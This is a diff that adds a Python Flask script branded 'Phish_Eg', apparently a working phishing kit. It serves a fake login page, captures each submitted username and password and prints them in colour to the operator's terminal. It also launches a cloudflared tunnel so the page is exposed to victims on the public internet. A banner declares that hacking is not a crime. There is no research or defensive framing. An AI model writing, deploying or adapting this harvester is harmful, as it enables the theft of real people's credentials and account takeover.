@@ -1,0 +1,74 @@
+import os
+import socket
+import time
+from flask import Flask, render_template, request, send_from_directory
+
+# Function to find an available port
+def find_free_port():
+    for port in range(8080, 8090):  # Checking ports in range 8080-8089
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            result = s.connect_ex(('localhost', port))
+            if result != 0:  # If port is free
+                return port
+    return None  # Return None if no free port is found
+
+# Clear the screen for hacker-style effect
+os.system('clear')  # Clears the terminal screen
+
+# Banner with red color and center alignment
+banner = """
+\033[1;31m
+===========================================🦅
+           E G A L E X 5
+     --- Hacking is not a crime, it's skills ---
+===========================================
+    Welcome to hacking World Phish_Eg
+===========================================
+\033[0m
+"""
+
+# Function to create a typewriter effect for the banner
+def print_banner_with_effect():
+    os.system('clear')  # Clear the terminal screen before displaying the banner
+    for char in banner:
+        print(char, end='', flush=True)
+        time.sleep(0.05)  # Delay between each character to create animation effect
+
+# Print banner with animation
+print_banner_with_effect()
+
+app = Flask(__name__)
+
+# Route to serve the index.html file
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        # Get the username and password from the form
+        username = request.form['username']
+        password = request.form['password']
+
+        # Print the username and password to the Termux screen with unique colors
+        print(f"\033[1;32mUsername: {username}\033[0m")  # Green for Username
+        print(f"\033[1;35mPassword: {password}\033[0m")  # Magenta for Password
+
+    return render_template('index.html')
+
+# Route to serve the CSS file
+@app.route('/static/style.css')
+def css():
+    return send_from_directory('static', 'style.css')
+
+# Route to serve the image
+@app.route('/static/images (17).jpeg')
+def image():
+    return send_from_directory('static', 'images (17).jpeg')
+
+if __name__ == '__main__':
+    # Find a free port
+    port = find_free_port()
+    if port:
+        print(f"\033[1;35mStarting Flask server on port {port}...\033[0m")
+        os.system(f"cloudflared tunnel --url http://localhost:{port} &")
+        app.run(host='0.0.0.0', port=port)
+    else:
+        print("\033[1;31mNo free port found in the range. Try again later.\033[0m")
